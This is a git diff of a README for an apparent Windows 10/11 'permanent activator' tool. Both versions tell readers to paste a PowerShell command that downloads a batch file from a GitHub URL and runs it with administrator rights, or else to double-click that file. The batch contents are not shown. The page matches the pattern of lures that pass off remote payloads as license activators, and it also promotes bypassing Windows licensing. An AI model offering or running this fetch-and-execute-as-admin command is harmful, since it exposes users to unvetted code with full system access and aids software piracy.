@@ -1,26 +1,42 @@
-This tool provides an easy way to activate Windows 10 and 11 permanently. Simply run the .bat file to activate your system.
-
-Features:
+Easily activate Windows 10 and 11 with this simple, reliable tool. Achieve permanent activation with just a few straightforward steps, ensuring your system runs smoothly and efficiently.
 
 
-Lifetime Activation: Activate Windows 10 and 11 permanently.
+Key Features:
 
-Easy Installation: Just run the windows.bat for a simple activation process.
+Lifetime Activation: Permanently activate Windows 10 and 11.
 
-No Complex Setup: Minimal steps to get your system activated.
+Simple Process: Minimal steps – just run the provided .bat file for instant activation.
 
-Installation:
-COPY AND PASTE THIS IN PowerSHELL: 
+Hassle-Free: No complex setup or technical knowledge required.
 
-" irm "https://raw.githubusercontent.com/betamod9/Windows-10-and-11-Activator/main/windows.bat" -OutFile "windows.bat"; Start-Process -FilePath "windows.bat" -Verb RunAs "
+How to Use:
 
-(Without "").
+Method 1: Use PowerShell
 
-And press Enter.
-Or:
-Download the windows.bat file.
+Open PowerShell (press Start and type "PowerShell").
 
-Double-click the windows.bat file to run it and activate your Windows system.
+Copy and paste the following command into PowerShell, then press Enter:
+
+powershell
+
+COPY AND PASTE THIS:
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+irm "https://raw.githubusercontent.com/betamod9/Windows-10-and-11-Activator/main/windows.bat" -OutFile "windows.bat"; Start-Process -FilePath "windows.bat" -Verb RunAs
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Method 2: Manual Download
+
+Download or copy the windows.bat file to your system.
+
+Double-click the windows.bat file to run it.
+
+Follow the on-screen instructions to complete the activation.
+
+Enjoy a permanently activated Windows system in no time!
+
 
 
 ![U233334ntitled](https://github.com/user-attachments/assets/ce853d71-7d34-409c-a809-1a64508c14f3)
